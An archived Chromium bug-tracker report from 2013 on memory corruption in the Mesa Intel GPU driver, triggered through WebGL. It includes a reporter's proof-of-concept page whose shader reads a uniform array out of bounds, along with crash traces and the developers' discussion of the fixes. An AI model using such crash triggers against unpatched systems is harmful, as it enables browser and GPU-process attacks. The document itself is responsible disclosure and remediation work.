# Security: memory corruption with webgl on linux intel driver

| Field | Value |
|-------|-------|
| **Issue ID** | [40076791](https://issues.chromium.org/issues/40076791) |
| **Status** | New |
| **Severity** | S4-Minimal |
| **Priority** | P0 |
| **Component** | Internals, Internals>GPU |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | mi...@gmail.com |
| **Assignee** | fj...@chromium.org |
| **Created** | 2013-01-09 |
| **Bounty** | $3,133.00 |

## Description

**VULNERABILITY DETAILS**  

AddressSanitizer: attempting free on address which was not malloc()-ed: 0x7fffe551a440

**VERSION**  

Chrome Version: stable + dev  

Operating System: 64bit ubuntu, intel and gallium drivers

**REPRODUCTION CASE**  

--no-sandbox --skip-gpu-data-loading

<html>
<head>
<script id="vshader" type="x-shader/x-vertex">
void main()
{
gl\_Position = vec4(0,0,0,0);
}
</script>
```
<script id="fshader" type="x-shader/x-fragment">  
  precision mediump float;  
  uniform vec4 uni[16];  
  void main()  
  {  
    vec4 c = vec4(0,0,0,0);  
    for (int ii = -11; ii < -4; ++ii) {  
      c += uni[ii];  
    }  
    gl_FragColor = vec4(c.r, c.g, c.b, 0);  
  }  
</script>  
<script>  
  function shader(gl, program, shaderType, shaderId) {  
    var shaderSource = document.getElementById(shaderId).text  
    var shader = gl.createShader(shaderType);  
    gl.shaderSource(shader, shaderSource);  
    gl.compileShader(shader);  
    gl.attachShader(program, shader)  
  }  

  function aProgram(gl) {  
    var program = gl.createProgram();  
    shader(gl, program, gl.VERTEX_SHADER, "vshader")  
    shader(gl, program, gl.FRAGMENT_SHADER, "fshader")  
    gl.linkProgram(program);  
    gl.useProgram(program);  
    return program;  
  }  
  var canvas = document.createElement('canvas')  
  var gl = canvas.getContext('experimental-webgl')  
  aProgram(gl)  
  gl.drawArrays(gl.TRIANGLES, 0, 1)  
</script>  

```
 </head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: gpu  

Crash State:

==21909== ERROR: AddressSanitizer: attempting free on address which was not malloc()-ed: 0x7fffe551a440  

#0 0x5555565f1e82 in free ??:0  

#1 0x7fffeaf7559c in ?? ??:0  

0x7fffe551a440 is located 63 bytes to the right of 0-byte region [0x7fffe551a401,0x7fffe551a401)  

freed by thread T0 (asan-release) here:  

#0 0x5a1105ffffffff  

#1 0x5a1105e2c0c63f

## Attachments

- [ww.html](attachments/ww.html) (text/html; charset=us-ascii, 1.3 KB)
- [ww.txt](attachments/ww.txt) (text/plain; charset=us-ascii, 1.3 KB)
- [scarybeasts2.html](attachments/scarybeasts2.html) (text/html; charset=us-ascii, 1.6 KB)
- deleted (application/octet-stream, 0 B)
- [scarybeasts.html](attachments/scarybeasts.html) (text/html; charset=us-ascii, 1.3 KB)
- [test.c](attachments/test.c) (text/x-c; charset=us-ascii, 3.4 KB)

## Timeline

### in...@chromium.org (2013-01-09)

[Empty comment from Monorail migration]

### kb...@chromium.org (2013-01-09)

With the array index clamping work that was just integrated into ANGLE, fixing this should be as easy as turning on the appropriate shader translator option on the command buffer service side.


### mi...@gmail.com (2013-01-10)

firefox is also affected https://bugzilla.mozilla.org/show_bug.cgi?id=827106

### sc...@gmail.com (2013-01-10)

Probably affects Chrome OS too?

Jorge, who was able to fix the last Mesa bug? I'm not sure they're on the cc: list.

### gm...@chromium.org (2013-01-10)

We'll also need to turn on the uniform packing restrictions otherwise the user can just declare a giant array.

### kb...@chromium.org (2013-01-10)

@gman: yes, agreed.


### jo...@chromium.org (2013-01-10)

+Frank who fixed Mesa issues in CrOS before.

### kb...@chromium.org (2013-01-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-01-12)

@miaubiz: interesting. Given that the current _stable_ version of Chrome OS doesn't yet have the full GPU sandbox, this is probably a SecSeverity-Critical, on account of your good timing :P

I don't suppose you have a repro that crashes outside of ASAN? I'd love to try it on my Chrome OS device.

### mi...@gmail.com (2013-01-12)

@scarybeasts: fiddling with the numbers produces a number of crashes, the numbers in the attachment give me:

[69555.351335] chrome[24531]: segfault at fffffffd555551b0 ip 0000555555caa01f sp 00007ffffffb86f0 error 4 in chrome[555555554000+55b9000]

another is:

[69358.362385] chrome[21158]: segfault at 0 ip 00007fffebcd29fe sp 00007ffffffb8a10 error 4 in i965_dri.so[7fffebc42000+ce000]

with regular build.


scarybeasts2.html randomizes the numbers

### mi...@gmail.com (2013-01-12)

re upload scarybeasts.html (it was same as the other one above)

### sc...@gmail.com (2013-01-12)

Heh. @miaubiz FTW

Chrome OS M23:

https://crash.corp.google.com/reportdetail?reportid=699cdad7d37e3efd

Thread 0 *CRASHED* ( SIGSEGV @ 0x00000039 )

0x7f6422549730	 [chrome]	 - third_party/tcmalloc/chromium/src/base/abort.cc:15]	tcmalloc::Abort
0x7f64225511df	 [chrome]	 - third_party/tcmalloc/chromium/src/internal_logging.cc:120]	tcmalloc::Log
0x7f642254f3b0	 [chrome]	 - third_party/tcmalloc/chromium/src/free_list.cc:133]	tcmalloc::FL_Next
0x7f642254f4cb	 [chrome]	 - third_party/tcmalloc/chromium/src/free_list.cc:167]	tcmalloc::FL_Pop
0x7f642598ec44	 [chrome]	 - third_party/tcmalloc/chromium/src/thread_cache.h:209]	tc_calloc
0x7f641f7c4b51	 [libglsl.so]	 - ralloc.c:117]	ralloc_size
0x7f641f7e67cb	 [libglsl.so]	 - glsl_symbol_table.cpp:33]	glsl_symbol_table::add_variable
0x7f641f7f5a9c	 [libglsl.so]	 - linker.cpp:566]	cross_validate_globals
0x7f641f7f60c7	 [libglsl.so]	 - linker.cpp:930]	link_intrastage_shaders
0x7f641f7f7570	 [libglsl.so]	 - linker.cpp:2257]	link_shaders
0x7f641fa77d1a	 [libdricore.so]	 - program/ir_to_mesa.cpp:3234]	_mesa_glsl_link_shader
0x7f641fa6917b	 [libdricore.so]	 - drivers/common/meta.c:371]	_mesa_meta_glsl_Clear
0x7f6424db2d2b	 [chrome]	 - gpu/command_buffer/service/gles2_cmd_decoder.cc:3181]	gpu::gles2::GLES2DecoderImpl::ResizeOffscreenFrameBuffer
0x7f6424dab8cf	 [chrome]	 - gpu/command_buffer/service/gles2_cmd_decoder.cc:2265]	gpu::gles2::GLES2DecoderImpl::Initialize
0x7f6424da92ef	 [chrome]	 - content/common/gpu/gpu_command_buffer_stub.cc:420]	GpuCommandBufferStub::OnInitialize
0x7f6424da8c35	 [chrome]	 - ./base/tuple.h:714]	GpuCommandBufferStub::OnMessageReceived
0x7f6424da81e1	 [chrome]	 - content/common/message_router.cc:47]	MessageRouter::RouteMessage
0x7f6424da7f32	 [chrome]	 - content/common/gpu/gpu_channel.cc:437]	GpuChannel::HandleMessage
0x7f6424cf5d4a	 [chrome]	 - ./base/callback.h:389]	MessageLoop::RunTask
0x7f6424cf5c57	 [chrome]	 - base/message_loop.cc:482]	MessageLoop::DeferOrRunPendingTask
0x7f6424cd1292	 [chrome]	 - base/message_loop.cc:661]	MessageLoop::DoWork
0x7f6424cd10b8	 [chrome]	 - base/message_pump_default.cc:28]	base::MessagePumpDefault::Run
0x7f6424cd0e51	 [chrome]	 - base/run_loop.cc:45]	base::RunLoop::Run
0x7f6424cd0d13	 [chrome]	 - base/message_loop.cc:307]	MessageLoop::Run
0x7f6424d89f19	 [chrome]	 - content/gpu/gpu_main.cc:208]	GpuMain
0x7f6424cc3b5f	 [chrome]	 - content/app/content_main_runner.cc:723]	content::ContentMainRunnerImpl::Run
0x7f6424cb8dd0	 [chrome]	 - content/app/content_main.cc:35]	content::ContentMain
0x7f6424cb8cc7	 [chrome]	 - chrome/app/chrome_main.cc:32]	ChromeMain
0x7f64201e041c	 [libc-2.15.so]	 - libc-start.c:234]	__libc_start_main
0x7f642253ee78	 [chrome]	 + 0x007d3e78]	

And that particular tcmalloc Abort is for "memory corruption detected"

### fj...@chromium.org (2013-01-14)

I converted the webgl code to C and it reliably crashes in the same neighborhood when linked with tcmalloc.  With system malloc it's more random, can get farther, but still crashes.  I'll see if this is fixed upstream, if not I can take a stab at it.
kbr: may I take?

### kb...@chromium.org (2013-01-14)

@fjhenigman: yes, certainly you can take the bug.

Note that the planned fix for Chromium is under review at https://codereview.chromium.org/11884007/ . It will fix all the client facing 3D APIs (WebGL, Pepper 3D, etc.).


### fj...@chromium.org (2013-01-14)

If I understand that change, it translates array access from u[i] to u[clamp(i,L,H)].
But the mesa bug happens at compile time, it's not caused by out-of-bounds array access at run time.  The change might, by chance, work around this particular compiler bug, but it's not really addressing the issue, and I'm concerned about the run time performance penalty it introduces.

### kb...@chromium.org (2013-01-14)

@fjhenigman: you're right, it introduces a run-time clamp. I hadn't looked at the stack trace above but you're right, it's a compile-time crash. In that case https://codereview.chromium.org/11884007/ won't fix this. (It was a postulated fix -- I don't have a machine that reproduces the crash -- but one that is needed regardless.)

May I assign this bug to you to try to fix in Mesa?


### ja...@gmail.com (2013-01-14)

Has this been reported to Mesa developers already? They have this shiny new hidden-bugs option on their bugzilla now ;-) just make sure to un-assign the default assignee which is a public mailing list.

### fj...@chromium.org (2013-01-14)

I'm still looking to see if it's fixed upstream.  If not I'll file the bug, and try to fix it, though it could be hairy.

### jo...@chromium.org (2013-01-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-01-15)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=176889

------------------------------------------------------------------------
r176889 | kbr@chromium.org | 2013-01-15T12:38:46.174311Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/service/shader_translator.cc?r1=176889&r2=176888&pathrev=176889

Enable array index clamping in shader translator.

BUG=169054
TEST=none


Review URL: https://chromiumcodereview.appspot.com/11884007
------------------------------------------------------------------------

### fj...@chromium.org (2013-01-15)

Not yet fixed in upstream mesa.  Security bug filed:
https://bugs.freedesktop.org/show_bug.cgi?id=59429
The link won't work unless you have permission to view security bugs.  I can view it because I submitted it - I'll keep an eye on it.

I'll try to figure out this code and fix myself.  At the least perhaps I can disable the problem code - at a glance it might be just an optimization, not essential stuff.  In a debug build of mesa an assertion is hit before the crash, which could be a good clue.

### ja...@gmail.com (2013-01-15)

Could you please CC me on the Mesa bug? I am bjacob@mozilla.com there

### fj...@chromium.org (2013-01-15)

#22 done.  Evidently people on the CC can view, so if anyone else wants on let me know.

### jo...@chromium.org (2013-01-15)

[Comment Deleted]

### in...@chromium.org (2013-01-15)

So, http://src.chromium.org/viewvc/chrome?view=rev&revision=176889 won't fix the bug chrome-side ?

### kb...@chromium.org (2013-01-15)

Sorry, no, it won't.


### in...@chromium.org (2013-01-15)

[Empty comment from Monorail migration]

### fj...@chromium.org (2013-01-17)

There was some code in mesa's shader compilation that barfed on out-of-bounds uniform access.  If you made the mistake directly in your code it would be noticed in time, but in this case it's not obvious enough until the loop gets unrolled, and they don't check again after that.  This changes barf to compilation failure (actually happens at link time):
https://gerrit.chromium.org/gerrit/41548

With this change my C test reports the link error, but webgl doesn't, it says "context lost."  Maybe you webgl guys could pass the error on through?

### ja...@gmail.com (2013-01-17)

Based on your work fixing this in Mesa, do you see a work-around or a way to detect shaders that will trigger this bug? I'm trying to figure if browsers running on desktop Linux will have to blacklist existing versions of the Intel driver or not.

### fj...@chromium.org (2013-01-17)

Well, if you want to analyze all the loops, computing array indices...  doesn't seem too practical.  And only for loops that actually unroll, which is a mesa implementation detail you don't want to have to care about.
Rewriting the way that was first proposed (u[i] -> u[f(i)]) might defeat the optimization that mesa was trying to do here (compacting the uniforms down to only ones that are used).  So if you don't mind losing that, plus adding the overhead of f(i)...
I'll play around with that and report back.

### ja...@gmail.com (2013-01-17)

Thanks a lot for working on this. As usual with driver bugs exposed by WebGL, from a short-term practical standpoint, finding a work-around is as important as fixing the bug, as users won't get new drivers overnight.

### kb...@chromium.org (2013-01-17)

@fjhenigman: the only reason WebGL should be reporting context lost in this situation is if (a) Chrome's GPU process crashes or (b) the shader compilation takes too long and the GPU process's watchdog kills the process. Can you run Chrome's Task Manager, display process IDs, and see whether the GPU process's PID changes while running the test? (Or look in about:gpu for crashes?)


### kb...@chromium.org (2013-01-17)

BTW, I expect the reason the WebGL version might be crashing is that as of the fix in https://crbug.com/chromium/169054#c20, the shader will be rewritten so that the indexing expressions are clamped to the bounds of the array.


### ma...@chromium.org (2013-01-19)

[Empty comment from Monorail migration]

### fj...@chromium.org (2013-01-21)

re 32-33: I was misled by spurious "context lost" messages in the javascript console.
A page that does nothing but create a context (makes no gl calls at all), each time it is
reloaded will cause "context lost" to flash briefly in the console.
Now that I know that, I believe everything works as expected.
Without clamping the patch does its job: instead of crashing generates an error which shows up in webgl.
With clamping the patched area is avoided.  So in addition to any performance hit, clamping is also
masking a useful error.  It would be nice if you could turn it on only for known broken drivers.

re 29: I tried and did not find a way to hit the bug with the clamping rewriting in effect.
Doesn't mean there isn't one, but it's certainly not as easy.

### ja...@gmail.com (2013-01-21)

re 35: sorry I'm a bit slow --- does this mean that the clamping works around the driver bug after all?

### fj...@chromium.org (2013-01-21)

re 36: I wasn't guaranteeing that, but the more I think about it the more it seems safe.  The breakage occurs when code is transformed (inlined/unrolled/etc) all the way to u[c] where c is an out-of-bounds constant.  In u[clamp(x)] if the clamp is transformed away then the resulting constant must be in bounds.  If the clamp is not transormed away then it shouldn't trigger the bug.  So it should be ok.

### hs...@chromium.org (2013-01-22)

CC ihf - 176889 causes rendering problems on daisy

### jo...@chromium.org (2013-01-23)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-01-23)

Project: chromiumos/overlays/chromiumos-overlay
Branch : master
Author : Frank Henigman <fjhenigman@chromium.org>
Commit : fdb7bd3503d6334e577335c7ecc2056e55221df6

Code Review +1: Jorge Lucangeli Obes
Code Review +2: Stéphane Marchesin
Verified    +1: Frank Henigman
Change-Id     : Icbe560f704abeed87e36fa00c89062c3197c9add
Reviewed-at   : https://gerrit.chromium.org/gerrit/41548

Fail to compile in case of bad uniform access.

An assertion in fs_visitor::remove_dead_constants() would fail on code like
this, which accesses a non-existent uniform:
  uniform vec u[1];
  ...
  a += u[0] + u[1];

The code is checked for that error, but apparently only before transformations
like loop unrolling.  So the following code would get transformed to the same
as above and then the assertion would fail:
  for (int i = 0; i < 2; ++i) a += u[i];

This patch changes the assertion failure to a compile failure.
It also adds initialization for a variable that previously had none but is
tested by another assertion in the same function.

Upstream bug: https://bugs.freedesktop.org/show_bug.cgi?id=59429

BUG=chromium:169054
TEST=run test.c from bug report and see shader link error (cannot test with chrome now because it works around the bug)

Commit-Queue: Frank Henigman <fjhenigman@chromium.org>

A  media-libs/mesa/files/9.0-fail-compile-on-bad-uniform-access.patch
D  media-libs/mesa/mesa-9.0-r1.ebuild
A  media-libs/mesa/mesa-9.0-r2.ebuild
M  media-libs/mesa/mesa-9999.ebuild

### fj...@chromium.org (2013-01-29)

I made a mesa fix in chromeos and am working to upstream something.
Is anyone addressing https://crbug.com/chromium/169054#c38?  There should be someone far more competent than me with daisy graphics.

### jo...@chromium.org (2013-01-29)

I think Ken and Haixia fixed/worked around the issue in c#38?

### kb...@chromium.org (2013-01-31)

Yes, hshi@ contributed an ANGLE patch that changed how the array index clamping is done, and that was rolled into Chromium. The array index clamping was re-enabled in https://code.google.com/p/chromium/issues/detail?id=172323 .


### [Deleted User] (2013-01-31)

@kbr: I've kind of lost track of the changes going on here. I'd like to regain track of them because we do need to merge a fix for this issue to M25.

Do we need both the Mesa change and the ANGLE change? Or.....?

### fj...@chromium.org (2013-01-31)

I'd rather not reexamine the need for the mesa change in light of the new clamping implementation.  The easy and safe thing to do is merge both changes.

### kb...@chromium.org (2013-01-31)

@cevans: I would prefer to let the fix enabling array index clamping be tested in M26 for a little while before merging it back to M25. It involves multiple merges in the ANGLE tree:

https://code.google.com/p/angleproject/source/detail?r=1638
https://code.google.com/p/angleproject/source/detail?r=1719
https://code.google.com/p/angleproject/source/detail?r=1733
https://code.google.com/p/angleproject/source/detail?r=1734

as well as one in the Chromium tree:

http://src.chromium.org/viewvc/chrome?view=rev&revision=179005

and has the potential to break both users' shaders as well as ones created internally by Chrome.


### jo...@chromium.org (2013-02-04)

Hey Ken, would you like to wait for a dev-channel release on Linux to merge this back?

### kb...@chromium.org (2013-02-04)

@jorgelo: yes, waiting for a dev channel release (on all platforms, not just linux) would be good. The enabling of array index clamping has the potential to affect a lot of content -- not just WebGL, but Flash and Stage 3D -- and I am nervous about merging it back without a good amount of testing on all of Windows, Mac and Linux. Personally, I would prefer to turn it on just in M26. This Mesa bug has been present for a long while. We could also consider blacklisting Mesa again on most non-Chrome OS platforms.


### sc...@gmail.com (2013-02-04)

@kbr: the problem is actually Chrome OS vs. Pwnium 3 vs. $110,000.
Technically, since this bug is "known", it's off the table for Pwnium 3, but that would be a pretty tough thing to explain and I'd rather not have to :-)

Is the mesa fix alone no good? Seems like we have a buffer overflow in mesa and there must be some mesa-contained fix that simply teaches mesa to respect its buffer bounds a little harder?

### jo...@chromium.org (2013-02-04)

Yeah, can we just merge https://gerrit.chromium.org/gerrit/41548 to M25 for Chrome OS?

### kb...@chromium.org (2013-02-04)

Merging https://gerrit.chromium.org/gerrit/41548 to M25 sounds like a good and safe solution to me.


### fj...@chromium.org (2013-02-05)

The mesa fix alone should be enough.  My reasoning is in #37 if anyone wants to check it.  But now I'm thinking we can do better.  My original fix addresses one function, but if other functions similarly operate on post-transformation shader code and expect uniform access to be in bounds, there could be other bugs like this one.
To say nothing of what could happen if an instruction for an out-of-bounds read makes it to the gpu (or cpu in the case of alex!).
Uniforms are supposed to be read-only, but do we trust the shader compiler to enforce that?

One of the comments from upstream was rather than fail to compile we should substitute zero for all out-of-bounds reads.  I started working on that, and if it can be done it would eliminate all these concerns.

### kb...@chromium.org (2013-02-05)

Wouldn't it be necessary to do run-time checks to detect out-of-bounds reads? Not all out-of-bounds accesses are (easily) statically analyzable. It's for this reason that the WebGL spec is more stringent than the OpenGL ES SL spec in this area, and why the shader translator in ANGLE now inserts clamp instructions around array accesses.


### jo...@chromium.org (2013-02-05)

Re c#52 and c#53: I would defer to Frank and let him decide what's safer to merge... I personally would just merge the 26 fix to 25, but if we can get a better fix in for 26 we can merge both back.

Ken's comment seems to be very reasonable though =(

### fj...@chromium.org (2013-02-05)

re #53 yes I wasn't thinking of run time.  Clearly at compile time we can only really guard against bugs in the compiler.  I'll have to check now which the upstream commenter had in mind.

re #54 I see no reason not to merge the mesa change.  I don't really have an opinion on the run time clamping.  I don't understand the problems with it nor have a feel for how risky it is not to have it.

I'll keeping working on an improved mesa fix.  Maybe we can even do run time clamping there.

### jo...@chromium.org (2013-02-05)

25 backport: https://gerrit.chromium.org/gerrit/#/c/42597/

### bu...@chromium.org (2013-02-05)

Project  : chromiumos/overlays/chromiumos-overlay
Branch   : release-R25-3428.B
Author   : Frank Henigman <fjhenigman@chromium.org>
Committer: Jorge Lucangeli Obes <jorgelo@chromium.org>
Commit   : 0d1f66e3a21fdc32810ffdc7ff2e8491c7620d2c

Code Review  +2: Frank Henigman
Verified     +1: Jorge Lucangeli Obes
Commit Queue   : Chumped
Change-Id      : I58ef77cd243c07d0470f9c927ab7313b368803a5
Reviewed-at    : https://gerrit.chromium.org/gerrit/42597

BACKPORT: Fail to compile in case of bad uniform access.

An assertion in fs_visitor::remove_dead_constants() would fail on code like
this, which accesses a non-existent uniform:
  uniform vec u[1];
  ...
  a += u[0] + u[1];

The code is checked for that error, but apparently only before transformations
like loop unrolling.  So the following code would get transformed to the same
as above and then the assertion would fail:
  for (int i = 0; i < 2; ++i) a += u[i];

This patch changes the assertion failure to a compile failure.
It also adds initialization for a variable that previously had none but is
tested by another assertion in the same function.

Upstream bug: https://bugs.freedesktop.org/show_bug.cgi?id=59429

BUG=chromium:169054
TEST=run test.c from bug report and see shader link error (cannot test with chrome now because it works around the bug)

Commit-Queue: Frank Henigman <fjhenigman@chromium.org>

A  media-libs/mesa/files/9.0-fail-compile-on-bad-uniform-access.patch
D  media-libs/mesa/mesa-9.0-r1.ebuild
A  media-libs/mesa/mesa-9.0-r2.ebuild
M  media-libs/mesa/mesa-9999.ebuild

### jo...@chromium.org (2013-02-05)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-02-11)

@miaubiz: thanks for this bug.

It's an interesting case for reward. At the time reported, M23 was stable on Chrome OS and M23 does not have a sandbox for the GPU (M25 does). We'll reward at the impact level that was demonstrated on M23 stable at the time of the report -- critical.

=> $3133.7

### pa...@chromium.org (2013-02-25)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-03-05)

Processing via our e-payment system can take a few weeks, but reward should be on its way to you. Thanks again for your help!

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### kr...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/169054?no_tracker_redirect=1

[Multiple monorail components: Internals, Internals>GPU]
[Monorail mergedwith: crbug.com/chromium/231390]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076791)*
